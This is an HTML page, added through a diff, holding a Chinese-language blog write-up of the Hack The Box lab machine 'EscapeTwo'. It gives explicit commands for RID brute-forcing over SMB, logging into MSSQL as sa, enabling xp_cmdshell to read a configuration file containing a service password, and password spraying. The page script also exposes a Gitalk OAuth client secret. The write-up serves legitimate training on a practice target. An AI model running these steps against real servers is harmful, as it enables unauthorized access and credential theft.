@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[HTB] EscapeTwo | fallingskies</title>
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://fallingskies22.github.io/favicon.ico?v=1783248062137">
+<link rel="stylesheet" href="https://fallingskies22.github.io/styles/main.css">
+
+
+  
+    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css" />
+  
+
+  
+
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+
+
+
+    <meta name="description" content="User
+端口探测，大概能判别出是一台域控服务器。
+53/tcp 和 53/udp - domain：⽤于域名系统（DNS），⽤于将域名转换为对应的IP地址和反向操作
+88/tcp 和 88/udp - kerberos-sec：⽤于Ker..." />
+    <meta name="keywords" content="" />
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://fallingskies22.github.io">
+        <img src="https://fallingskies22.github.io/images/avatar.png?v=1783248062137" class="site-logo">
+        <h1 class="site-title">fallingskies</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            标签
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/post/friends" class="site-nav">
+            友链
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      <h3>想要去月球<h3>
+    </div>
+    <div class="site-footer">
+      Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a> | <a class="rss" href="https://fallingskies22.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[HTB] EscapeTwo</h2>
+            <div class="post-date">2025-04-12</div>
+            
+              <div class="feature-container" style="background-image: url('https://fallingskies22.github.io/post-images/htb-escapetwo.png')">
+              </div>
+            
+            <div class="post-content" v-pre>
+              <h2 id="user">User</h2>
+<p>端口探测，大概能判别出是一台域控服务器。</p>
+<pre><code>53/tcp 和 53/udp - domain：⽤于域名系统（DNS），⽤于将域名转换为对应的IP地址和反向操作
+88/tcp 和 88/udp - kerberos-sec：⽤于Kerberos认证协议，⽤于⽹络身份验证。
+135/tcp - msrpc：⽤于Microsoft远程过程调⽤（MSRPC），主要⽤于在⽹络上执⾏远程操作。
+139/tcp - netbios-ssn：⽤于NetBIOS会话服务，⽤于在⽹络上共享⽂件和打印机等资源。
+389/tcp 和 389/udp - ldap：⽤于轻型⽬录访问协议（LDAP），⽤于在⽹络上访问和维护⽬录信息。
+445/tcp - microsoft-ds：⽤于Microsoft的共享⽂件和打印机服务，也称为Server Message Block （SMB）。
+464/tcp - kpasswd5：⽤于Kerberos密码修改协议，⽤于在⽹络上修改Kerberos认证的密码。
+593/tcp - http-rpc-epmap：⽤于Microsoft远程过程调⽤（RPC）端⼝映射，⽤于远程通信。
+636/tcp - ldapssl：⽤于加密的轻型⽬录访问协议（LDAP），安全的LDAP通信。
+3268/tcp 和 3269/tcp - globalcatLDAP 和 globalcatLDAPssl：⽤于全局⽬录服务的LDAP通信，⽤ 于在多个域之间搜索和查找⽤户信息。
+5985/tcp - wsman：⽤于Web Services Management（WS-Management），⽤于远程管理和监视 Windows系统。
+9389/tcp - adws：⽤于Active Directory Web Services（ADWS），⽤于在⽹络上管理Active Directory域。
+470001/tcp - winrm Windows远程管理服务,⽤于Windows系统的远程管理和配置
+49664,49665,49666,49667,49685,49686,49689,49702,49723,49744,49808这些为动态随机端口
+</code></pre>
+<p>使用<a href="https://manesec.github.io/2023/10/28/2023/2023-10-rid-brute/">rid枚举</a>来获取账户名</p>
+<pre><code class="language-shell">python cme smb 10.10.11.51 -u &quot;rose&quot; -p &quot;KxEPkKe6R8su&quot; --rid-brute
+</code></pre>
+<p>筛选出SidTypeUser</p>
+<p>查看SMB共享文件<br>
+使用资源管理器访问<code>//10.10.11.51</code></p>
+<p>从 accounts.xlsx  中获得mssql账户</p>
+<p>使用<a href="https://github.com/maaaaz/impacket-examples-windows">impacket</a>中mssqlclient工具链接</p>
+<pre><code class="language-shell">.\mssqlclient.exe sequel.htb/sa:'MSSQLP@ssw0rd!'@10.10.11.51
+</code></pre>
+<pre><code class="language-sql">EXEC sp_configure 'show advanced options', 1;
+RECONFIGURE;
+EXEC sp_configure 'xp_cmdshell', 1;
+RECONFIGURE;
+</code></pre>
+<p>使用xp_cmdshell执行命令<br>
+当前用户为sql_svc，在users目录中发现ryan用户<br>
+在C:下发现SQL2019,cd进去发现ExpressAdv_ENU在该目录下发现sql-Configuration.INI</p>
+<pre><code class="language-sql"> EXEC xp_cmdshell 'powershell -Command &quot;type C:\\SQL2019\ExpressAdv_ENU\sql-Configuration.INI&quot;'
+</code></pre>
+<p>发现sql_svc账户密码WqSZAF6CysDQbGb3</p>
+<p>使用密码喷洒，发现该密码同样为ryan用户密码。</p>
+<p>使用ryan用户登录smb，即访问<code>//10.10.11.51</code>，查看文件\10.10.11.51\Users\ryan\Desktop\user.txt</p>
+<h2 id="参考文章">参考文章</h2>
+<p><a href="https://fdlucifer.github.io/2020/12/14/crackmapexec/">crackmapexec终极指南</a><br>
+<a href="https://zhuanlan.zhihu.com/p/25031519607">Windows渗透实战之EscapeTwo</a></p>
+
+            </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://fallingskies22.github.io/post/lesslessdong-shou-xue-shen-du-xue-xi-greatergreater-huan-jing-an-zhuang/">
+                  <h3 class="post-title">
+                    《动手学深度学习》- 环境安装
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+              
+                <div id="gitalk-container" data-aos="fade-in"></div>
+              
+
+              
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+<script type="application/javascript">
+
+AOS.init();
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+  <script src="//cdn.jsdelivr.net/gh/highlightjs/cdn-release@11.5.1/build/highlight.min.js"></script>
+  <script>
+    hljs.initHighlightingOnLoad()
+  </script>
+
+
+
+
+  
+    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+    <script>
+
+      var gitalk = new Gitalk({
+        clientID: '1b08861b8ad19018640e',
+        clientSecret: '1881a7245597aa70e1ffc8412e5b6c1eb0ad7241',
+        repo: 'fallingskies22.github.io',
+        owner: 'fallingskies22',
+        admin: ['fallingskies22'],
+        id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+        distractionFreeMode: false  // Facebook-like distraction free mode
+      })
+
+      gitalk.render('gitalk-container')
+
+    </script>
+  
+
+  
+
+
+
+
+  </body>
+</html>
